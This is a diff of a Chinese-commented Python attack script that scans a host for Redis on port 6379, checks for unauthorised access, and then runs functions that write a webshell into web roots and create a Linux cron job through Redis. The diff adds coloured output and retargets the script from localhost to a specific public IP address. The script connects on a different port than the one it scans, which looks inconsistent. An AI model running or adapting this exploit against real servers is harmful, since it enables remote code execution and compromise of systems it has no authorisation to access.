@@ -7,7 +7,6 @@
 
 import concurrent.futures
 import socket
-
 import redis
 
 
@@ -29,7 +28,7 @@ def start_scan():
             try:
                 future.result()
             except Exception as e:
-                print(f"扫描异常: {str(e)}")
+                print(f"\033[91m扫描异常: {str(e)}\033[0m")
 
 
 def scan_port(ip):
@@ -42,11 +41,11 @@ def scan_port(ip):
     s.settimeout(0.3)  # 设置超时时间
     try:
         s.connect((ip, 6379))  # 尝试连接到 Redis 默认端口 6379
-        print(f"[+] {ip} 的 6379 端口上有 Redis 服务")
+        print(f"\033[92m[+] {ip} 的 6379 端口上有 Redis 服务\033[0m")
         s.close()
         check_redis_connect(ip)
     except socket.error:
-        print("[-] 6379 端口已关闭")
+        print("\033[91m[-] 6379 端口已关闭\033[0m")
         return
 
 
@@ -57,28 +56,27 @@ def check_redis_connect(ip):
     :param ip: 需要检查的 IP 地址
     """
     try:
-        r = redis.StrictRedis(host=ip, port=6379, socket_timeout=0.3)
+        r = redis.StrictRedis(host=ip, port=47241, socket_timeout=3)
         info = r.info()
 
         # 新增操作系统判断
-        os_type = info.get('os', 'linux').strip().lower()  # 从Redis信息中获取操作系统类型
-        print(f"{os_type}")
+        os_type = info.get('os').strip().lower()  # 从Redis信息中获取操作系统类型
+        print(f"\033[92m[+] 目标操作系统类型: {os_type}\033[0m")
         if info:
-            print(f"[+] {ip}  存在未授权访问（运行系统：{os_type.upper()}）")  # 增加系统类型提示
-            print(f"[+] {r.client_list()}")
+            print(f"\033[92m[+] {ip}  存在未授权访问（运行系统：{os_type.upper()}）\033[0m")
+            print(f"\033[92m[+] {r.client_list()}\033[0m")
             # 根据操作系统调用不同攻击模块
-            if os_type == 'linux':
+            if os_type == 'linux' or 'linux' == os_type.split()[0]:
                 exp_crontab(r)
                 exp_webShell(r, os_type)
 
-            if os_type == 'windows':
+            if os_type == 'windows' or 'windows' == os_type.split()[0]:
                 exp_webShell(r, os_type)
 
     except (redis.ConnectionError, redis.ResponseError) as e:
-        print(f"[-] 连接或操作失败: {str(e)}")
+        print(f"\033[91m[-] 连接或操作失败: {str(e)}\033[0m")
 
 
-# 修改漏洞利用函数增加系统适配
 def exp_webShell(redis_client, os_type):
     """
     根据操作系统写入webshell
@@ -91,7 +89,6 @@ def exp_webShell(redis_client, os_type):
         'linux': '/var/www/html',
         'windows': 'D:/phpstudy_pro/WWW'
     }
-    # os_type = 'windows'  # 或 'windows'
     # 如果无法识别操作系统则尝试通用路径
     target_dir = web_roots.get(os_type)
     try:
@@ -104,10 +101,10 @@ def exp_webShell(redis_client, os_type):
         # 保存Redis配置
         redis_client.save()
         # 成功信息输出
-        print(f"[+] Webshell 写入成功至 {target_dir}")
+        print(f"\033[92m[+] Webshell 写入成功至 {target_dir}\033[0m")
     except redis.ResponseError:
         # 错误处理，当路径配置失败时输出错误信息
-        print(f"[-] 路径 {target_dir} 配置失败，可能权限不足或路径不存在")
+        print(f"\033[91m[-] 路径 {target_dir} 配置失败，可能权限不足或路径不存在\033[0m")
 
 
 def exp_crontab(redis_client):
@@ -126,12 +123,12 @@ def exp_crontab(redis_client):
         # 保存Redis配置
         redis_client.save()
         # 打印成功消息
-        print(f"[+] Linux定时任务已创建")
+        print(f"\033[92m[+] Linux定时任务已创建\033[0m")
     # 捕获Redis响应错误
     except redis.ResponseError as e:
         # 打印错误消息
-        print(f"定时任务创建失败: {str(e)}")
+        print(f"\033[91m定时任务创建失败: {str(e)}\033[0m")
 
 
 if __name__ == '__main__':
-    scan_port("127.0.0.1")
+    scan_port("123.58.224.8")
